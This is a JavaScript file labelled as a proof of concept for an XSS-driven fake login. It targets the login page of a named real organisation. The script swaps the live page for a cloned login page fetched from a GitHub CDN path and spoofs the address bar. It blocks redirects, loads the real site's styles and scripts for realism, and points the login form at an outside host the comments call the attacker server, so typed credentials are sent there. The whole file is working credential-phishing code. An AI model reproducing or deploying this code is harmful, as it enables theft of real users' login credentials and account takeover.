// fakelogin.js - Full page fake login PoC (No redirect version)

(function() {
    'use strict';

    // Prevent any further redirects by overriding key functions
    window.location.replace = () => {};
    window.location.assign = () => {};
    window.location.reload = () => {};

    // Keep the address bar clean and realistic
    history.replaceState(null, 'GSSI Universal Login - Gatorade Performance Partner', '/gpapi/oauth/login');

    // Load your cloned login page
    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')
        .then(r => r.text())
        .then(html => {
            document.documentElement.innerHTML = html;

            // Wait a bit for DOM to settle, then fix everything
            setTimeout(() => {
                fixAllResources();
                blockRedirects();
                forceFormAction();
            }, 500);
        })
        .catch(err => {
            console.error('PoC load error:', err);
        });
})();

// Fix CSS, JS, and images to load from real domain
function fixAllResources() {
    const baseUrl = 'https://www.gssiweb.org/GPAPI/dist/lib/';

    // Fix all CSS links
    document.querySelectorAll('link[rel="stylesheet"]').forEach(link => {
        let href = link.getAttribute('href') || '';
        if (href && !href.startsWith('http')) {
            const filename = href.split('/').pop();
            link.href = baseUrl + filename;
        }
    });

    // Fix script sources (but skip Google Analytics/GTM if possible to reduce noise)
    document.querySelectorAll('script[src]').forEach(script => {
        let src = script.getAttribute('src') || '';
        if (src && !src.startsWith('http') && !src.includes('google') && !src.includes('gtm')) {
            const filename = src.split('/').pop();
            script.src = baseUrl + filename;
        }
    });

    // Fix any images
    document.querySelectorAll('img').forEach(img => {
        let src = img.getAttribute('src') || '';
        if (src && !src.startsWith('http')) {
            img.src = baseUrl + src.split('/').pop();
        }
    });
}

// Block common redirect techniques
function blockRedirects() {
    // Override dangerous methods
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function() {};
    history.replaceState = function(state, title, url) {
        // Only allow our own clean URL
        if (url && url.includes('login')) {
            originalReplaceState.call(history, state, title, '/gpapi/oauth/login');
        }
    };

    // Prevent form submission from causing redirect (if any JS interferes)
    const form = document.getElementById('DietaryLogin');
    if (form) {
        form.addEventListener('submit', function(e) {
            // Let the form submit naturally to your attacker server
            // Do NOT preventDefault() here
        }, true);
    }

    console.log('%c[PoC] Redirects blocked - Fake login page stable', 'color: lime; font-weight: bold');
}

// Ensure form always points to attacker server
function forceFormAction() {
    const form = document.getElementById('DietaryLogin');
    if (form) {
        form.action = 'https://hackersrising.com/GPAPI/oauth/login';
        form.method = 'post';
    }
}
